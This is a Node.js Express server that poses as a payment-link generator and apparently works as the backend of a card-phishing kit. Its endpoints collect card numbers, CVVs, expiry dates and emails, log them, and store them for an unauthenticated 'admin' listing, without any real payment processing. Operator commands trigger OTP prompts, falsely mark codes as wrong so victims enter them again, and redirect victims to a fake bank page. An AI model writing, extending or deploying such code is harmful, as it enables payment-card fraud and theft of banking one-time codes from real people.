import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
// Modify CORS setup at the top
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(bodyParser.json());
app.use(cors());
app.use(express.static(".")); // Serves static files from current directory

const transactions = new Map();
const paymentLinks = new Map();

/**
 * Single, corrected generatePaymentLink route (no duplicate code).
 */
// Keep ONLY THIS generatePaymentLink endpoint - delete any others
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;

    // Validation
    if (!amount || isNaN(amount)) 
      return res.status(400).json({ error: "Invalid amount" });
    if (!description?.trim()) 
      return res.status(400).json({ error: "Description required" });

    // Create payment link
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;

    // Store in Map
    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    res.json({ status: "success", paymentLink });

  } catch (error) {
    console.error('Payment Error:', error);
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * Fetch payment details (landing & payment pages).
 */
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({
      status: "error",
      message: "Payment details not found"
    });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

/**
 * Get transaction details (for success/fail pages).
 */
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

/**
 * Get all transactions (for admin panel).
 */
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

/**
 * Process payment details (from payment page).
 */
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();

  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''), // remove commas
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    bankpageVisible: false,
    timestamp: new Date().toLocaleString()
  };

  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

/**
 * Show OTP for a transaction (admin command).
 */
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

/**
 * Mark OTP as wrong (admin command).
 */
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

/**
 * Check transaction status (payment page polls this).
 */
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }

  // If OTP is pending & shown
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form to user",
      otpError: txn.otpError
    });
  }

  // If there's a redirect status set (success/fail/bankpage)
  if (txn.redirectStatus) {
    let redirectUrl;
    if (txn.redirectStatus === 'success') {
      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'fail') {
      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'bankpage') {
      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
    }
    return res.json({ status: "redirect", redirectUrl });
  }

  // Otherwise just return current status
  res.json({
    status: txn.status,
    otpError: txn.otpError
  });
});

/**
 * Submit OTP from client side.
 */
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

/**
 * Update redirect status (admin command: success/fail/bankpage).
 */
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl:
      redirectStatus === 'success'
        ? `/success.html?invoiceId=${invoiceId}`
        : redirectStatus === 'fail'
        ? `/fail.html?invoiceId=${invoiceId}`
        : `/bankpage.html?invoiceId=${invoiceId}`
  });
});

/**
 * Admin command to redirect to bank page specifically.
 */
app.post('/api/redirectToBankPage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = 'bankpage';
  console.log(`Transaction ${invoiceId} redirected to bank page`);
  res.json({ status: "success", message: "Redirecting to bank page" });
});

/**
 * Show/hide bank page commands
 */
app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  console.log(`Showing bankpage for transaction ${invoiceId}`);
  res.json({ status: 'success' });
});


app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  res.json({ status: 'success' });
});

/**
 * Start the server
 */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
